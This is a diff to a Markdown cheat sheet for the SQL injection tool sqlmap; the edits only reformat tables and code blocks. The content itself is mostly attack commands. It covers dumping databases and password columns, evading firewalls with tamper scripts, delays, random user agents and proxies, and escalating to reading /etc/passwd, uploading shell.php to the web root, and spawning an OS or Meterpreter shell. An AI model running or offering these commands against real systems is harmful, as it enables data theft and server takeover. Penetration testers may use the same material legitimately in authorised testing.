@@ -125,9 +125,9 @@ sqlmap -r request.txt -D <db_name> -T <table_name> --dump --batch
 
 | Goal        | Flag                                          |
 | ----------- | --------------------------------------------- |
-| Cookies     | "--cookie=""PHPSESSID=12345"""                |
-| Headers     | "-H ""X-Forwarded-For: 127.0.0.1"""           |
-| Login Creds | "--auth-type Basic --auth-cred ""user:pass""" |
+| Cookies     | --cookie="PHPSESSID=12345"                    |
+| Headers     | -H "X-Forwarded-For: 127.0.0.1"               |
+| Login Creds | --auth-type Basic --auth-cred "user:pass"     |
 
 #### 🛡️ 3. Bypassing Firewalls (WAF)
 
@@ -217,10 +217,10 @@ Once you've found the tables, you don't always need to dump the entire database.
 
 | Goal                    | Command                                      |
 | ----------------------- | -------------------------------------------- |
-| Dump Specific Columns   | "-D db -T users -C ""user,password"" --dump" |
+| Dump Specific Columns   | -D db -T users -C "user,password" --dump     |
 | Dump First 5 Rows       | --start 1 --stop 5                           |
-| Search for Table Names  | "--search -T ""admin"""                      |
-| Search for Column Names | "--search -C ""pass""                        |
+| Search for Table Names  | --search -T "admin"                          |
+| Search for Column Names | --search -C "pass"                           |
 
 ##### 🚀 The "Panic" Command
 
@@ -235,21 +235,46 @@ sqlmap -u "URL" --batch --threads=10 --level=3 --risk=2 --random-agent --dbms=MY
 ❌ Error: "Target URL appears not to be injectable" If you are sure it is
 vulnerable but SQLMap fails, try these:
 
-Increase Level/Risk: sqlmap -u [URL] --level=5 --risk=3
+Increase Level/Risk:
+
+```bash
+sqlmap -u [URL] --level=5 --risk=3
+```
 
 Use a Tamper Script: The WAF might be blocking standard payloads. Try
+
+``` bash
 --tamper=space2comment.
+```
 
 Check the Cookie: Your session might have expired. Refresh your browser and copy
 the new cookie.
 
 ❌ Error: "Connection timed out" or "403 Forbidden" Add a Delay: The server
-might have rate-limiting. Use --delay=1 or --delay=2.
+might have rate-limiting. Use
 
-Change User-Agent: Use --random-agent. Some sites block the default User-Agent:
+``` bash
+--delay=1
+
+or
+
+--delay=2.
+```
+
+Change User-Agent: Use
+
+``` bash
+--random-agent
+```
+
+Some sites block the default User-Agent:
 sqlmap.
 
-Use a Proxy: Your IP might be temporarily soft-blocked. Use --proxy.
+Use a Proxy: Your IP might be temporarily soft-blocked. Use
+
+``` bash
+--proxy.
+```
 
 ❌ Error: "Internal Server Error (500)" This often means the SQL injection is
 working but crashing the query. Try using a specific DBMS flag to make the
@@ -260,12 +285,12 @@ payloads cleaner: --dbms=mysql (or postgresql, mssql).
 If the database user has high privileges (like 'root' or 'sa'), you can go
 beyond data theft.
 
-| Command                       | Action                                                               |
-| ----------------------------- | -------------------------------------------------------------------- |
-| "--file-read=""/etc/passwd""" | Read a system file from the server.                                  |
-| "--file-write=""shell.php""   | --file-dest=""/var/www/html/""" Upload a file to the                 |
-| web                           | directory. --os-shell Attempt to gain an interactive command prompt. |
-| --os-pwn                      | Attempt to spawn a Meterpreter shell (requires Metasploit).          |
+| Command                                               | Action                                                       |
+| ------------------------------------------------------|--------------------------------------------------------------|
+| --file-read="/etc/passwd"                             |  Read a system file from the server.                         |
+| --file-write="shell.php" --file-dest="/var/www/html/" | Upload a file to the  web directory                          |
+|  --os-shell                                           | Attempt to gain an interactive command prompt.               |
+| --os-pwn                                              | Attempt to spawn a Meterpreter shell (requires Metasploit).  |
 
 #### 📋 The "Complete Checklist" One-Liner
 
